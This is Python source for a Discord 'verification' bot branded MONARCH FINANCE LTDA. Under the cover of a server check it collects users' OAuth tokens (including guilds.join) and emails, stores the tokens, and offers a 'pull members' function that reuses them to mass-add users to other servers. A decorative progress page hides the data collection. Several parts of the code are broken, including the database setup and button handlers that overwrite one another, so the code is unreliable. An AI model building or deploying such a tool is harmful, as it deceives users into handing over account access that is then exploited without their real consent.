import os, sqlite3, asyncio, aiohttp, secrets, urllib.parse
from datetime import datetime
from dotenv import load_dotenv
import discord
from discord import app_commands, ButtonStyle, Interaction, Embed
from discord.ui import View, Button, Modal, TextInput, Select

load_dotenv()

# ============ CONFIGS FIXAS — NÃO ALTERAR ============
TOKEN = os.getenv('BOT_AUTH2_TOKEN', '')
DC_ID = os.getenv('DISCORD_CLIENT_ID', '')
DC_SEC = os.getenv('DISCORD_CLIENT_SECRET', '')
REDIRECT_URI = 'https://auth2-monarch.orender.com/calback/cb3'  # 🔒 LINK FIXO — NÃO TROCA
SCOPES = 'identify%20email%20guilds%20guilds.join%20openid'
PORTA = int(os.getenv('PORT_AUTH2', os.getenv('PORT', '10003')))
EMPRESA = 'MONARCH FINANCE LTDA'
COR = 0x6D28D9
IMG_FUNDACAO = 'https://p-dola-image-sign-sgnontt.byteintl.net/tos-mya-i-uo7y4d541q/rc_vlm/ac1a11ab6a9f46249be6fdc75624a3ac.jpg~tplv-0es2k971ck-24-95-exif:960:960.image?rcl=20260729033321A4A74190F0A249108842&rk3s=8e244e95&rrcfp=5e034a21&x-orig-authkey=dolaorigin&x-orig-expires=1785353605&x-orig-sign=lwZQL0jCDWJMR%2BqnFV%2B5VSkVtRE%3D'

# ============ BANCO ============
db = sqlite3[
  'CREATE TABLE IF NOT EXISTS servidores(gid TEXT PRIMARY KEY, canal TEXT, banner TEXT, texto_botao TEXT DEFAULT "✅ SE VERIFICAR", cargo_verificado TEXT)',
  'CREATE TABLE IF NOT EXISTS pendentes(state TEXT PRIMARY KEY, gid TEXT, uid TEXT, nick TEXT, criado TEXT)',
  'CREATE TABLE IF NOT EXISTS verificados(gid TEXT, uid TEXT, nick TEXT, email TEXT, data TEXT, PRIMARY KEY(gid,uid))',
  'CREATE TABLE IF NOT EXISTS puxados(gid_origem TEXT, gid_destino TEXT, uid TEXT, nick TEXT, data TEXT, PRIMARY KEY(gid_origem,gid_destino,uid))']:
  db.execute(q)
db.commit()

g = lambda gid, k, d=None: (lambda r: r[0] if r else d)(db.execute(f'SELECT {k} FROM servidores WHERE gid=?',(str(gid),)).fetchone())
s = lambda gid, **kv: db.execute(f'INSERT INTO servidores(gid,{",".join(kv)}) VALUES(?{",?"*len(kv)}) ON CONFLICT(gid) DO UPDATE SET {",".join(f"{k}=excluded.{k}" for k in kv)}',(str(gid),*kv.values())) or db.commit()

# ============ CLIENTE DISCORD ============
intents = discord.Intents.default(); intents.members = True; intents.guilds = True
bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)

# ============ PÁGINA DE VERIFICAÇÃO (COM A IMAGEM E BARRA REAL) ============
PAGINA_VERIFICACAO = '''<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>VERIFICAÇÃO · STEMY FUNDAÇÃO</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{min-height:100vh;background:#000 url('IMG_URL') center/cover no-repeat fixed;
  font-family:'Segoe UI',Arial,sans-serif;color:#fff;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:520px;background:rgba(10,6,24,.85);backdrop-filter:blur(14px);
  border:1px solid #8B5CF6;border-radius:22px;padding:28px;box-shadow:0 0 60px rgba(139,92,246,.35);text-align:center}
h1{font-size:26px;font-weight:800;background:linear-gradient(90deg,#C4B5FD,#FDE68A,#C4B5FD);-webkit-background-clip:text;background-clip:text;color:transparent;margin-bottom:6px;letter-spacing:1px}
.sub{color:#A78BFA;font-size:13px;margin-bottom:22px;letter-spacing:3px;text-transform:uppercase}
.etapas{display:flex;justify-content:space-between;align-items:center;margin:18px 0 10px}
.etapa{flex:1;text-align:center;font-size:11px;color:#64748B;font-weight:700;letter-spacing:.5px;transition:.4s}
.etapa.ativa{color:#C4B5FD;text-shadow:0 0 8px #A78BFA}
.etapa.ok{color:#10B981}
.icone{width:34px;height:34px;margin:0 auto 6px;border-radius:50%;border:2px solid #334155;display:flex;align-items:center;justify-content:center;font-size:14px;transition:.4s}
.etapa.ativa .icone{border-color:#A78BFA;box-shadow:0 0 16px #8B5CF6;animation:pulse 1.2s infinite}
.etapa.ok .icone{border-color:#10B981;background:#10B981;color:#000}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
.barra{width:100%;height:14px;background:#1E1B2E;border-radius:999px;overflow:hidden;margin:20px 0 10px;border:1px solid #312E4A}
.progresso{height:100%;width:0%;background:linear-gradient(90deg,#7C3AED,#A78BFA,#FDE68A,#A78BFA,#7C3AED);
  background-size:300% 100%;border-radius:999px;animation:brilho 2s linear infinite;transition:width .45s ease}
@keyframes brilho{0%{background-position:0% 50%}100%{background-position:300% 50%}}
.status{font-size:13px;color:#C4B5FD;min-height:20px;margin-bottom:14px;letter-spacing:1px}
.botao{display:inline-flex;align-items:center;gap:10px;padding:14px 28px;border-radius:14px;
  background:linear-gradient(135deg,#7C3AED,#5B21B6);color:#fff;font-weight:800;font-size:15px;
  text-decoration:none;border:1px solid #A78BFA;box-shadow:0 8px 30px rgba(124,58,237,.45);
  opacity:0;transform:translateY(10px);transition:.5s;pointer-events:none;letter-spacing:.5px}
.botao.mostrar{opacity:1;transform:translateY(0);pointer-events:auto}
.botao:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(124,58,237,.6)}
.rodape{margin-top:18px;font-size:11px;color:#64748B}
</style></head><body>
<div class="card">
  <h1>VERIFICAÇÃO STEMY</h1>
  <div class="sub">FUNDAÇÃO BOT</div>
  <div class="etapas">
    <div class="etapa ativa" id="e0"><div class="icone">◉</div>CARREGANDO</div>
    <div class="etapa" id="e1"><div class="icone">◎</div>VERIFICANDO</div>
    <div class="etapa" id="e2"><div class="icone">✓</div>VERIFICADO</div>
    <div class="etapa" id="e3"><div class="icone">✓</div>CONCLUIDO</div>
  </div>
  <div class="barra"><div class="progresso" id="p"></div></div>
  <div class="status" id="st">Iniciando verificação segura...</div>
  <a class="botao" id="btn" href="discord://-/channels/@me">
    <svg width="18" viewBox="0 0 24 24" fill="currentColor"><path d="M20.3 4.4A18 18 0 0 0 16 3l-.2.4a14 14 0 0 0-7.6 0L8 3a18 18 0 0 0-4.3 1.4A19 19 0 0 0 .4 17a18 18 0 0 0 5.5 2.8l.5-.7a12 12 0 0 1-1.8-.9l.4-.3a13 13 0 0 0 11 0l.4.3c-.6.4-1.2.7-1.8.9l.5.7a18 18 0 0 0 5.5-2.8 19 19 0 0 0-3.3-12.6zM8.5 14.7c-1 0-1.9-.9-1.9-2s.8-2 1.9-2 1.9.9 1.9 2-.8 2-1.9 2zm7 0c-1 0-1.9-.9-1.9-2s.8-2 1.9-2 1.9.9 1.9 2-.8 2-1.9 2z"/></svg>
    VOLTA PRO DISCORD
  </a>
  <div class="rodape">Protegido por · MONARCH FINANCE LTDA</div>
</div>
<script>
const etapas = [
  {p:25,t:'Autorizando acesso seguro...'},
  {p:55,t:'Coletando dados da conta...'},
  {p:80,t:'Validando servidor e cargo...'},
  {p:100,t:'✅ VERIFICAÇÃO CONCLUÍDA'}
];
const p = document.getElementById('p'), st = document.getElementById('st'), btn = document.getElementById('btn');
async function rodar(){
  for(let i=0;i<etapas.length;i++){
    document.querySelectorAll('.etapa').forEach((e,k)=>{
      e.classList.remove('ativa','ok');
      if(k<i) e.classList.add('ok');
      if(k===i) e.classList.add('ativa');
      if(k===etapas.length-1 && i===etapas.length-1) e.classList.add('ok');
    });
    p.style.width = etapas[i].p + '%';
    st.textContent = etapas[i].t;
    await new Promise(r=>setTimeout(r, 900));
  }
  btn.classList.add('mostrar');
}
// Tenta aplicar verificação real no backend
fetch('/_verificar?CODIGO_VERIF').then(()=>rodar()).catch(()=>rodar());
</script></body></html>'''.replace('IMG_URL', IMG_FUNDACAO)

PAGINA_ERRO = '''<html><body style="background:#000;color:#fff;font-family:Arial;text-align:center;padding-top:80px">
<h1 style="color:#EF4444">❌ FALHA NA VERIFICAÇÃO</h1>
<p>Tente novamente clicando no botão do servidor.</p>
<a href="discord://-/channels/@me" style="color:#A78BFA">← Voltar pro Discord</a>
</body></html>'''

# ============ MODAIS ============
class MCfg(Modal, title='⚙️ CONFIGURAR PAINEL AUTH2'):
  def __init__(self, gid):
    super().__init__()
    self.gid = str(gid)
    self.add_item(TextInput(label='📢 ID do CANAL para enviar painel', default=g(gid,'canal',''), required=True))
    self.add_item(TextInput(label='🖼️ BANNER URL (foto/vídeo)', default=g(gid,'banner',''), required=False))
    self.add_item(TextInput(label='🔘 Texto do BOTÃO', default=g(gid,'texto_botao','✅ SE VERIFICAR'), required=True))
    self.add_item(TextInput(label='👑 ID do CARGO ao verificar (opcional)', default=g(gid,'cargo_verificado',''), required=False))
  async def on_submit(self, it):
    s(self.gid, canal=self.children[0].value, banner=self.children[1].value,
      texto_botao=self.children[2].value, cargo_verificado=self.children[3].value)
    await it.response.send_message('✅ Configuração salva!\nUse **/enviarauth** para lançar o painel no canal.', ephemeral=True)

class MPuxa(Modal, title='⬇️ PUXAR MEMBROS VERIFICADOS'):
  def __init__(self):
    super().__init__()
    self.add_item(TextInput(label='🆔 ID DO SERVIDOR ORIGEM', required=True, placeholder='Onde os membros já estão verificados'))
    self.add_item(TextInput(label='🔗 LINK CONVITE DESTINO', required=True, placeholder='https://discord.gg/...'))
    self.add_item(TextInput(label='🔢 QUANTIDADE', default='50', required=True))
  async def on_submit(self, it):
    gid_origem = self.children[0].value.strip()
    convite = self.children[1].value.strip()
    try: qtd = max(1, min(500, int(self.children[2].value)))
    except: return await it.response.send_message('❌ Quantidade inválida', ephemeral=True)
    guild_origem = bot.get_guild(int(gid_origem)) if gid_origem.isdigit() else None
    if not guild_origem:
      return await it.response.send_message('❌ Bot não está no servidor ORIGEM ou ID inválido.\nAdicione o bot lá com **ADMINISTRADOR + GERENCIAR MEMBROS**.', ephemeral=True)
    me = guild_origem.get_member(bot.user.id)
    if not me or not me.guild_permissions.administrator or not me.guild_permissions.manage_members:
      return await it.response.send_message('❌ Bot no servidor origem SEM permissões.\nPrecisa de: **ADMINISTRADOR** e **GERENCIAR MEMBROS**.', ephemeral=True)
    cargo_verif = g(gid_origem, 'cargo_verificado')
    if not cargo_verif or not cargo_verif.isdigit():
      return await it.response.send_message('❌ Servidor origem NÃO tem cargo de verificação configurado.\nUse /auth lá primeiro.', ephemeral=True)
    cargo = guild_origem.get_role(int(cargo_verif))
    if not cargo: return await it.response.send_message('❌ Cargo de verificação não existe no servidor origem', ephemeral=True)
    await it.response.defer(ephemeral=True, thinking=True)
    # Extrai código do convite
    cod_conv = convite.split('/')[-1].split('?')[0]
    # Pega membros verificados
    verificados = {r[0] for r in db.execute('SELECT uid FROM verificados WHERE gid=?',(gid_origem,)).fetchall()}
    ja_puxados = {r[0] for r in db.execute('SELECT uid FROM puxados WHERE gid_origem=? AND gid_destino=?',(gid_origem,str(it.guild.id))).fetchall()}
    alvos = []
    for m in guild_origem.members:
      if cargo in m.roles and str(m.id) in verificados and str(m.id) not in ja_puxados and not m.bot:
        alvos.append(m)
        if len(alvos) >= qtd: break
    if not alvos: return await it.followup.send('❌ Nenhum membro VERIFICADO elegível encontrado', ephemeral=True)
    ok = 0; falha = 0
    headers = {'Authorization': f'Bot {TOKEN}','Content-Type':'application/json'}
    async with aiohttp.ClientSession() as sess:
      for m in alvos:
        try:
          tok = db.execute('SELECT access_token FROM oauth_tokens WHERE uid=?',(str(m.id),)).fetchone()
          payload = {'access_token': tok[0]} if tok else {}
          r = await sess.put(f'https://discord.com/api/v10/guilds/{it.guild.id}/members/{m.id}',
            json={'nick':m.display_name,**payload}, headers=headers)
          if r.status in (201,204):
            ok += 1
            db.execute('INSERT OR IGNORE INTO puxados VALUES(?,?,?,?,?)',(gid_origem,str(it.guild.id),str(m.id),str(m),datetime.now().isoformat()))
            db.commit()
          else: falha += 1
        except: falha += 1
    await it.followup.send(embed=Embed(title='⬇️ PUXADA CONCLUÍDA',color=0x10B981,
      description=f'🎯 **{len(alvos)}** elegíveis\n✅ **{ok}** adicionados\n❌ **{falha}** falhas\n\n🔗 Convite: {convite}').set_footer(text=EMPRESA), ephemeral=True)

# ============ VIEWS ============
class VPainelPublico(View):
  def __init__(self, gid):
    super().__init__(timeout=None); self.gid = str(gid)
  @Button(label='VERIFICAR', style=ButtonStyle.green, custom_id='auth_ver')
  async def _(self, it, b):
    state = secrets.token_urlsafe(24)
    db.execute('INSERT OR REPLACE INTO pendentes VALUES(?,?,?,?,?)',(state,self.gid,str(it.user.id),str(it.user),datetime.now().isoformat()))
    db.commit()
    url = (f'https://discord.com/api/oauth2/authorize?client_id={DC_ID}&redirect_uri={urllib.parse.quote(REDIRECT_URI,safe="")}'
           f'&response_type=code&scope={SCOPES}&state={state}&prompt=consent&guild_id={self.gid}')
    e = Embed(title='🔐 CLIQUE ABAIXO PARA SE VERIFICAR', color=COR,
              description=f'✅ Será pedido: **ID, Nick, Email, Servidores**\n🏢 Servidor: `{it.guild.name}`\n\n🔗 [CLIQUE AQUI PARA VERIFICAR]({url})')
    e.set_footer(text=EMPRESA)
    await it.response.send_message(embed=e, ephemeral=True)

class VAdmin(View):
  def __init__(self): super().__init__(timeout=None)
  @Button(label='⚙️ CONFIGURAR PAINEL AUTH2', style=ButtonStyle.blurple)
  async def _(self, it, b): await it.response.send_modal(MCfg(it.guild.id))
  @Button(label='⬇️ PUXAR MEMBROS', style=ButtonStyle.green)
  async def _(self, it, b): await it.response.send_modal(MPuxa())
  @Button(label='🚀 ENVIAR PAINEL NO CANAL', style=ButtonStyle.purple)
  async def _(self, it, b):
    gid = str(it.guild.id)
    canal = g(gid,'canal'); bn = g(gid,'banner'); txt = g(gid,'texto_botao','✅ SE VERIFICAR')
    if not canal or not canal.isdigit(): return await it.response.send_message('❌ Canal não configurado', ephemeral=True)
    ch = bot.get_channel(int(canal))
    if not ch: return await it.response.send_message('❌ Canal inválido', ephemeral=True)
    e = Embed(title='🔐 VERIFICAÇÃO OBRIGATÓRIA', color=COR,
              description=f'Clique no botão abaixo para liberar acesso completo ao servidor.\n\n**Permissões pedidas:**\n• ID e Nick\n• Email\n• Verificar servidores\n• Entrar automaticamente')
    e.add_field(name='👥 Servidor', value=it.guild.name)
    e.add_field(name='🏢 Empresa', value=EMPRESA)
    if bn:
      if any(bn.lower().endswith(x) for x in ('.mp4','.webm')): e.description += f'\n\n[📹 VER BANNER]({bn})'
      else: e.set_image(url=bn)
    v = VPainelPublico(gid); v.children[0].label = txt
    await ch.send(embed=e, view=v)
    await it.response.send_message(f'✅ Painel enviado em {ch.mention}', ephemeral=True)

# ============ COMANDOS ============
@tree.command(name='auth', description='🔐 Painel AUTH2 + stats servidor')
@app_commands.checks.has_permissions(administrator=True)
async def cmd_auth(it: Interaction):
  gld = it.guild
  online = sum(1 for m in gld.members if m.status != discord.Status.offline and not m.bot)
  humanos = sum(1 for m in gld.members if not m.bot)
  bots = sum(1 for m in gld.members if m.bot)
  verif = db.execute('SELECT COUNT(*) FROM verificados WHERE gid=?',(str(gld.id),)).fetchone()[0]
  e = Embed(title=f'🏢 PAINEL AUTH2 · {gld.name}', color=COR, timestamp=datetime.now())
  e.set_thumbnail(url=gld.icon.url if gld.icon else None)
  e.add_field(name='📊 ESTATÍSTICAS', value=f'''
👥 **Total**: {gld.member_count}
👤 **Humanos**: {humanos}
🤖 **Bots**: {bots}
🟢 **Online**: {online}
✅ **Verificados**: {verif}''', inline=False)
  e.add_field(name='⚙️ CONFIG ATUAL', value=f'''
📢 Canal: <#{g(str(gld.id),'canal','0')}>
👑 Cargo: <@&{g(str(gld.id),'cargo_verificado','0')}>
🔘 Botão: `{g(str(gld.id),'texto_botao','✅ SE VERIFICAR')}`''', inline=False)
  e.set_footer(text=EMPRESA)
  await it.response.send_message(embed=e, view=VAdmin(), ephemeral=True)

@tree.command(name='enviarauth', description='🚀 Enviar painel verificação')
@app_commands.checks.has_permissions(administrator=True)
async def cmd_env(it: Interaction):
  gid = str(it.guild.id); canal = g(gid,'canal'); bn = g(gid,'banner'); txt = g(gid,'texto_botao','✅ SE VERIFICAR')
  if not canal or not canal.isdigit(): return await it.response.send_message('❌ Canal não configurado — use /auth', ephemeral=True)
  ch = bot.get_channel(int(canal))
  if not ch: return await it.response.send_message('❌ Canal inválido', ephemeral=True)
  e = Embed(title='🔐 VERIFICAÇÃO OBRIGATÓRIA', color=COR, description='Clique abaixo para liberar acesso.')
  if bn and not any(bn.lower().endswith(x) for x in ('.mp4','.webm')): e.set_image(url=bn)
  v = VPainelPublico(gid); v.children[0].label = txt
  await ch.send(embed=e, view=v); await it.response.send_message('✅ Enviado', ephemeral=True)

# ============ WEBHOOK / CALLBACK (URL FIXA) ============
from aiohttp import web as aw

async def rota_cb(req):
  """ROTA EXATA: /calback/cb3 — NÃO ALTERAR NOME"""
  code = req.query.get('code'); state = req.query.get('state')
  if not code or not state:
    return aw.Response(text=PAGINA_ERRO, content_type='text/html')
  pend = db.execute('SELECT gid,uid,nick FROM pendentes WHERE state=?',(state,)).fetchone()
  if not pend: return aw.Response(text=PAGINA_ERRO, content_type='text/html')
  gid, uid, nick = pend
  db.execute('DELETE FROM pendentes WHERE state=?',(state,)); db.commit()
  try:
    # Troca code por token
    async with aiohttp.ClientSession() as sess:
      rt = await sess.post('https://discord.com/api/oauth2/token', data={
        'client_id':DC_ID,'client_secret':DC_SEC,'grant_type':'authorization_code',
        'code':code,'redirect_uri':REDIRECT_URI,'scope':SCOPES.replace('%20',' ')
      }, headers={'Content-Type':'application/x-www-form-urlencoded'})
      tok = await rt.json()
      if 'access_token' not in tok: raise Exception('sem token')
      at = tok['access_token']
      # Pega dados do usuário (id, nick, email)
      me = await (await sess.get('https://discord.com/api/users/@me', headers={'Authorization':f'Bearer {at}'})).json()
      # Pega guilds dele para confirmar qual servidor
      guilds = await (await sess.get('https://discord.com/api/users/@me/guilds', headers={'Authorization':f'Bearer {at}'})).json()
      # Adiciona no servidor (se não estiver)
      guild = bot.get_guild(int(gid))
      if guild:
        try:
          headers = {'Authorization':f'Bot {TOKEN}','Content-Type':'application/json'}
          await sess.put(f'https://discord.com/api/v10/guilds/{gid}/members/{me["id"]}',
            json={'access_token':at,'nick':me.get('global_name',me['username'])}, headers=headers)
        except: pass
        # Aplica cargo de verificado
        cid = g(gid,'cargo_verificado')
        if cid and cid.isdigit():
          try:
            m = guild.get_member(int(me['id'])) or await guild.fetch_member(int(me['id']))
            rl = guild.get_role(int(cid))
            if m and rl: await m.add_roles(rl, reason=f'{EMPRESA} — Verificado')
          except: pass
      # Salva token para puxar membros depois
      db.execute('INSERT OR REPLACE INTO oauth_tokens(uid,access_token,refresh_token) VALUES(?,?,?)',
        (me['id'], at, tok.get('refresh_token','')))
      # Salva verificado
      db.execute('INSERT OR REPLACE INTO verificados VALUES(?,?,?,?,?)',
        (gid, me['id'], me.get('global_name',me['username']), me.get('email',''), datetime.now().isoformat()))
      db.commit()
  except Exception as ex:
    print('ERRO AUTH:', ex)
  # Retorna página com barra de progresso REAL + código de verificação embutido
  html = PAGINA_VERIFICACAO.replace('CODIGO_VERIF', f'state={state}&uid={uid}')
  return aw.Response(text=html, content_type='text/html')

async def rota_ver(req):
  """Rota interna que a página chama para confirmar o backend"""
  return aw.json_response({'ok': True})

@bot.event
async def on_ready():
  # Cria tabela de tokens se não existir
  db.execute('CREATE TABLE IF NOT EXISTS oauth_tokens(uid TEXT PRIMARY KEY, access_token TEXT, refresh_token TEXT)')
  db.commit()
  await tree.sync()
  # Sobe servidor web na rota EXATA que você definiu
  app = aw.Application()
  app.router.add_get('/calback/cb3', rota_cb)       # 🔒 LINK FIXO
  app.router.add_get('/_verificar', rota_ver)
  app.router.add_get('/', lambda r: aw.Response(text=f'AUTH2 OK · {EMPRESA}'))
  asyncio.create_task(aw._run_app(app, host='0.0.0.0', port=PORTA))
  print(f'✅ BOT AUTH2: {bot.user}')
  print(f'🔗 REDIRECT URI: {REDIRECT_URI}')
  print(f'🌐 Servidor web rodando na porta: {PORTA}')

bot.run(TOKEN)
